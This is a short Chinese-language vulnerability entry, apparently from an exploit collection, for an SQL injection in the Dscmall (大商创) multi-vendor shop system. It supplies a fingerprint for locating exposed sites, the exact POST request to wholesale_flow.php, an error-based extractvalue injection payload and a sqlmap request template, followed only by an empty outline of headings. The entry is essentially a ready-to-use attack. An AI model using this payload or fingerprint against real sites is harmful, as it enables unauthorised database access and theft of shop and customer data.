# 大商创多用户商城系统wholesale_flow存在SQL注入漏洞

- **系统**：大商创多用户商城系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="Dscmall"`
- **请求**：`POST /wholesale_flow.php?step=ajax_update_cart HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 48`

**请求体 / payload**
```
rec_ids[]=extractvalue(1,concat(0x7e,md5(2725)))

sqlmap
POST /wholesale_flow.php?step=ajax_update_cart HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
rec_ids[]=1
```

**其他**
- 大商创多用户商城系统wholesale\_flow存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 大商创多用户商城系统